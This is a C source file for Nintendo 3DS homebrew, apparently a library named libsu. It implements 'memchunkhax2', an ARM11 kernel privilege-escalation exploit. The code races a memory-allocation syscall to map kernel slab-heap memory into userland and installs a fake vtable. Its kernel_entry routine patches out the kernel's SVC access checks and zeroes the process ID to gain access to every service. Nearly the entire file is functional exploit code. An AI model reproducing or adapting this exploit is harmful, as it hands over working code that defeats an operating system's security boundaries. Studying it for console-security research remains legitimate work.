#include "libsu.h"
#include <3ds.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef SUDEBUG
	#define debugPrint(...) 		printf(__VA_ARGS__)
	#define debugPrintError(...) 	({printf(__VA_ARGS__); return -1;})
#else
	#define debugPrint(...) 
	#define debugPrintError(...) 	({return -1;})
#endif


// 		MEMCHUNKHAX II AREA
#define SLABHEAP_VIRTUAL	0xFFF70000
#define SLABHEAP_PHYSICAL 	0x1FFA0000
#define KERNEL_SHIFT		0x40000000
#define PAGE_SIZE 			0x1000

#define waitUserlandAccessible(x) while((u32) svcArbitrateAddress(arbiter, x, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814)

typedef struct {
    u32 size;
    void* next;
    void* prev;
} MemChunkHdr;

typedef struct {
    u32 addr;
    u32 size;
    Result result;
} AllocateData;

extern u32 __ctru_heap;
extern u32 __ctru_heap_size;
volatile u8 isNew3DS = 0;
volatile u32 kernelHacked = -1;
volatile u32 pidBackup = 0;

static void patchPID()
{
	// Patch PID in order access all services
	u32 kObjAddr;
	if(isNew3DS) 	
		kObjAddr = 0xBC;
	else			
		kObjAddr = 0xB4;
	u8* KProcess = (u8*) *((u32*)0xFFFF9004);
	pidBackup = *((u32*)(KProcess + kObjAddr));
	*((u32*)(KProcess + kObjAddr)) = 0;
}

static void unpatchPID()
{
	// Restore what we changed
	u32 kObjAddr;
	if(isNew3DS) 	
		kObjAddr = 0xBC;
	else			
		kObjAddr = 0xB4;
	u8* KProcess = (u8*) *((u32*)0xFFFF9004);
	*((u32*)(KProcess + kObjAddr)) = pidBackup;
}

static void kernel_entry() {
	// Patch SVC access control
	// Searches the access checks in kernel memory
	// then patch it in order to skip them.
	u32* kmem = (u32*)0xdff80000;
	for(int i = 0; i < 0x10000; i++)
	{
		if( kmem[i + 0] == 0x0AFFFFEA &&
			kmem[i + 1] == 0xE35A0000 &&
			kmem[i + 2] == 0x0A00000D &&
			kmem[i + 3] == 0xE3A0E000 )
		{
			kmem[i + 0] = 0xE320F000; // NOP
			kmem[i + 2] = 0xE320F000; // NOP
		}
	}
	
	//Invalidate icache and dcache since we edited kernel code
	__asm ("mov r0, #0");
	__asm ("mcr p15, 0, r0, c7, c5, 0");
	__asm ("mcr p15, 0, r0, c7, c10, 0");
	patchPID();
	kernelHacked = 0;
}

// Thread function to slow down svcControlMemory execution.
static void delay_thread(void* arg) {
    AllocateData* data = (AllocateData*) arg;

    // Slow down thread execution until the control operation has completed.
    while(data->result == -1) {
        svcSleepThread(10000);
    }
}

// Thread function to allocate memory pages.
static void allocate_thread(void* arg) {
    AllocateData* data = (AllocateData*) arg;

    // Allocate the requested pages.
    data->result = svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
}

// Creates an event and outputs its kernel object address (at ref count, not vtable pointer) from r2.
static Result __attribute__((naked)) svcCreateEventKAddr(Handle* event, u8 reset_type, u32* kaddr) {
    asm volatile(
            "str r0, [sp, #-4]!\n"
            "str r2, [sp, #-4]!\n"
            "svc 0x17\n"
            "ldr r3, [sp], #4\n"
            "str r2, [r3]\n"
            "ldr r3, [sp], #4\n"
            "str r1, [r3]\n"
            "bx lr"
    );
}

int memchunkhax2()
{
	Handle arbiter = __sync_get_arbiter();
    u32 isolatedPage = 0;
    u32 isolatingPage = 0;
    Handle kObjHandle = 0;
    u32 kObjAddr = 0;
    Thread delayThread = NULL;
	Result res;
	
	debugPrint("#1 : Allocating buffers...\n");
	AllocateData* data = (AllocateData*) malloc(sizeof(AllocateData));
	if(!data) debugPrintError("ERROR : Can't allocate data.\n");
	data->addr = __ctru_heap + __ctru_heap_size;
    data->size = PAGE_SIZE * 2;
    data->result = -1;
	
    void** vtable = (void**) linearAlloc(16 * sizeof(u32));
	if(!vtable) debugPrintError("ERROR : Can't allocate data.\n");
	for(int i = 0; i < 16; i++) {
        vtable[i] = kernel_entry;
    }
	
    void* backup = malloc(PAGE_SIZE);
	if(!backup) debugPrintError("ERROR : Can't allocate data.\n");
	
	debugPrint("#2 : Allocating pages...\n");
	// Makes all the threads be on core 1
    aptOpenSession();
    if(APT_SetAppCpuTimeLimit(30) != 0)
		debugPrintError("ERROR : Can't force threads to core 1.\n");
    aptCloseSession();
	
	res = svcControlMemory(&isolatedPage, data->addr + data->size, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
	if(!res) res = svcControlMemory(&isolatingPage, isolatedPage + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
    if(!res) res = svcControlMemory(&isolatedPage, isolatedPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
	if(res != 0) debugPrintError("ERROR : Can't allocate pages.\n");
	
	isolatedPage = 0;

    // Create a KSynchronizationObject in order to use part of its data as a fake memory block header.
    // Within the KSynchronizationObject, refCount = size, syncedThreads = next, firstThreadNode = prev.
    // Prev does not matter, as any verification happens prior to the overwrite.
    // However, next must be 0, as it does not use size to check when allocation is finished.
    if(svcCreateEventKAddr(&kObjHandle, 0, &kObjAddr) != 0)
		debugPrintError("ERROR : Can't create kernel object.\n");
	
	// Consider the physical address of the kobject, preventing the kernel shift.
	kObjAddr = kObjAddr - SLABHEAP_VIRTUAL + SLABHEAP_PHYSICAL - KERNEL_SHIFT;
	
	debugPrint("#3 : Map SlabHeap in userland...\n");
	// Create thread to slow down svcControlMemory execution and another to allocate the pages.
    delayThread = threadCreate(delay_thread, data, 0x4000, 0x18, 1, true);
	if(!delayThread)
		debugPrintError("ERROR : Can't create delaying thread.\n");
		
    if(!threadCreate(allocate_thread, data, 0x4000, 0x3F, 1, true))
		debugPrintError("ERROR : Can't create allocating thread.\n");
	
	waitUserlandAccessible(data->addr);	// This oracle will tell us exactly when we can write in memory.
	((MemChunkHdr*) data->addr)->next = (MemChunkHdr*) kObjAddr;   // Edit the memchunk to redirect mem mapping.
	
	// Perform a backup of the kernel page (or at least for what we can)
	waitUserlandAccessible(data->addr + PAGE_SIZE + (kObjAddr & 0xFFF)); 
	memcpy(backup, (void*) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) ), PAGE_SIZE - (kObjAddr & 0xFFF));
	if(data->result != -1) debugPrintError("ERROR : Race condition failed.\n");
	
	debugPrint("#4 : Overwrite completed...\n");
	// Wait for memory mapping to complete.
    while(data->result == -1) svcSleepThread(1000000);
	if(data->result != 0) debugPrintError("ERROR : Failed memory mapping.\n");
	
	debugPrint("#5 : Restoring SlabHeap backup...\n");
	// Restore the kernel memory backup first
	memcpy((void*) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF)), backup, PAGE_SIZE - (kObjAddr & 0xFFF));
	
	debugPrint("#6 : Setup fake vtable...\n");
	//waitUserlandAccessible(data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) - 4); 
    *(void***) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) - 4) = vtable;
	
	debugPrint("#7 : Clean memory and release kobject...\n");
	if(data != NULL && data->result == 0)
        svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_FREE, MEMPERM_DONTCARE);
		
	// Stop the delaying thread
    if(delayThread != NULL && data != NULL && data->result == -1) data->result = 0;

    if(isolatedPage != 0) {
        svcControlMemory(&isolatedPage, isolatedPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
        isolatedPage = 0;
    }
	
    if(isolatingPage != 0) {
        svcControlMemory(&isolatingPage, isolatingPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
        isolatingPage = 0;
    }
	
    if(backup) free(backup);
    if(data) free(data);
	if(kObjHandle != 0) svcCloseHandle(kObjHandle);
	if(vtable) linearFree(vtable);
	
	srvExit();
	while(kernelHacked != 0) svcSleepThread(1000000);
	debugPrint("#8 : Grant access to all services and SVCs...\n");
    srvInit();
	svcSleepThread(0x4000000LL);
	APT_SetAppCpuTimeLimit(80);
	return 0;
}
//		END OF MEMCHUNKHAX II AREA

int suInit()
{
	APT_CheckNew3DS(&isNew3DS);
	debugPrint("ARM11 Kernel Exploit\n");
	
	int res = memchunkhax2();
	if(!res) 
		debugPrint("Success!\n");
	else
		debugPrint("Failure! :(\n");
	
	return res;
}